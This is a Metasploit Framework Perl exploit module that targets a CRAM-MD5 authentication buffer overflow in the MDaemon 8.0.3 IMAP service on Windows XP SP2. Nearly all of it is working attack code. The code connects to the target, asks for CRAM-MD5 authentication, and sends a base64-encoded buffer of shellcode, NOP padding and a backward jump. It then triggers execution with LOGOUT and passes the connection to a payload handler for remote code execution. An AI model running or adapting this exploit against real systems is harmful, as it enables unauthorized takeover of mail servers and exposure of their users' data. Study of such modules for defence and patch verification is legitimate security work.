MDaemon 8.0.3 IMAPD CRAM-MD5 Authentication Overflow Exploit
============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::mdaemon_imap_cram_md5;
use strict;
use base &#039;Msf::Exploit&#039;;
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = { };

my $info = {
	&#039;Name&#039;    => &#039;Mdaemon 8.0.3 IMAD CRAM-MD5 Authentication Overflow&#039;,
	&#039;Version&#039;  => &#039;$Revision: 1.2 $&#039;,
	&#039;Authors&#039; => [ &#039;anonymous&#039; ],

	&#039;Arch&#039;    => [ &#039;x86&#039; ],
	&#039;OS&#039;      => [ &#039;win32&#039;],
	&#039;Priv&#039;    => 1,

	&#039;AutoOpts&#039;  => { &#039;EXITFUNC&#039;  => &#039;process&#039; },
	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The target port&#039;, 143],
	  },

	&#039;Payload&#039; =>
	  {
		&#039;Prepend&#039;	=> "\x81\xc4\x1f\xff\xff\xff\x44", # make stack happy
		&#039;Space&#039;     => 500,
		&#039;BadChars&#039;  => "\x00",
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
    This module exploits a buffer overflow in the CRAM-MD5 authentication of the
    MDaemon IMAP service. This vulnerability was discovered by Muts.
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;OSVDB&#039;, &#039;11838&#039;],
		[&#039;CVE&#039;,   &#039;2004-1520&#039;],
		[&#039;BID&#039;,   &#039;11675&#039;],
	  ],

	&#039;Targets&#039; =>
	  [
		[&#039;MDaemon IMAP 8.0.3 Windows XP SP2&#039;],
	  ],

	&#039;Keys&#039; => [&#039;mdaemon&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;

	my $targetHost  = $self->GetVar(&#039;RHOST&#039;);
	my $targetPort  = $self->GetVar(&#039;RPORT&#039;);
	my $targetIndex = $self->GetVar(&#039;TARGET&#039;);
	my $encodedPayload = $self->GetVar(&#039;EncodedPayload&#039;);
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $sock = Msf::Socket::Tcp->new(
		&#039;PeerAddr&#039; => $targetHost,
		&#039;PeerPort&#039; => $targetPort,
	  );
	  
	if($sock->IsError) {
		$self->PrintLine(&#039;Error creating socket: &#039; . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine(&#039;[*] Got Banner: &#039; . $resp);

	my $req = "a001 authenticate cram-md5\r\n";
	$sock->Send($req);
	$self->PrintLine(&#039;[*] CRAM-MD5 authentication method asked&#039;);

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine(&#039;[*] Got CRAM-MD5 answer: &#039; . $resp);

	# Magic no return-address exploitation ninjaness!
	$req = "AAAA" . $shellcode . $self->MakeNops(258) . "\xe9\x05\xfd\xff\xff";
	$req = Pex::Text::Base64Encode($req, &#039;&#039;) . "\r\n";
	$sock->Send($req);
	$self->PrintLine(&#039;[*] CRAM-MD5 authentication with shellcode sent&#039;);

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine(&#039;[*] Got authentication reply: &#039; . $resp);

	$req = "a002 LOGOUT\r\n";
	$sock->Send($req);
	$self->PrintLine(&#039;[*] Send LOGOUT to close the thread and trigger an exception&#039;);

	$resp = $sock->Recv(-1);
	chomp($resp);
	$self->PrintLine(&#039;[*] Got LOGOUT reply: &#039; . $resp);

	$self->PrintLine("[*] Overflow request sent, sleeping for one second");
	select(undef, undef, undef, 1);

	$self->Handler($sock);
	return;
}

1;


